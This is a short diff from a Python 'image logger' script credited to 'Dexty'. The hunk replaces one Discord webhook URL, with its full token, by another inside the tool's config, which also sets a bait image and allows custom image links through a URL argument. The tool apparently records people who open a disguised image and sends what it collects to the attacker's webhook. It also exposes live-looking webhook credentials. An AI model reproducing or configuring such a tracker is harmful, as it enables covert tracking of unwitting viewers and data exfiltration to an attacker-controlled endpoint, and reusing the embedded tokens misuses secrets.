@@ -12,7 +12,7 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1503448441987137648/GPO8-0nDZ2daNi7OBl-nkk-e2-yfd6_1GIiv2kflRT8iRHjdtn3SqFi59DL3AosaCmdt",
+    "webhook": "https://discord.com/api/webhooks/1503461999844134942/r5VdjuXXj4OQBbjnfbSgRk3hI1D9SGBisyuMbb6g0bN1azoTbQWRhIv0h3vXmgFKigDj",
     "image": "https://media.tenor.com/uy_OBkkROWIAAAAe/yummy-tongue.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
